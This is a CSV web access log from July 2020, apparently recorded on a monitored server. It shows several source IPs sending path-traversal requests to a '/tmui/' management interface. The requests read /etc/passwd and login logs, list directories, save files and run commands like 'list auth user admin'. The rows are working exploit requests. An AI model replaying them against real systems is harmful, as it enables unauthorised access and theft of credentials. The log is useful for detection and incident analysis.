Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 7, 2020 @ 22:59:25.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/resolv.conf,curl/7.70.0,200
"Jul 7, 2020 @ 22:59:21.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:59:19.000",139.162.116.230,GET,/,-,400
"Jul 7, 2020 @ 22:59:17.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/hosts,curl/7.70.0,500
"Jul 7, 2020 @ 22:59:02.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/proc/uptime,curl/7.70.0,200
"Jul 7, 2020 @ 22:58:18.000",185.100.86.154,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:36.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/var/log/lastlog,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:30.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:30.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:27.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/var/log/wtmp,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:15.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/proc/uptime,curl/7.70.0,200
"Jul 7, 2020 @ 22:57:14.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:14.000",165.254.62.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,curl/7.67.0,200
"Jul 7, 2020 @ 22:57:13.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:13.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:11.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:11.000",165.254.62.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,curl/7.67.0,200
"Jul 7, 2020 @ 22:57:03.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:57:02.000",89.236.112.100,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,curl/7.70.0,200
"Jul 7, 2020 @ 22:56:53.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/hosts,curl/7.70.0,500
"Jul 7, 2020 @ 22:56:53.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:45.000",185.67.82.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp,curl/7.70.0,200
"Jul 7, 2020 @ 22:56:42.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:32.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:22.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:11.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:56:00.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:55:45.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
"Jul 7, 2020 @ 22:55:43.000",45.12.206.76,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0,200
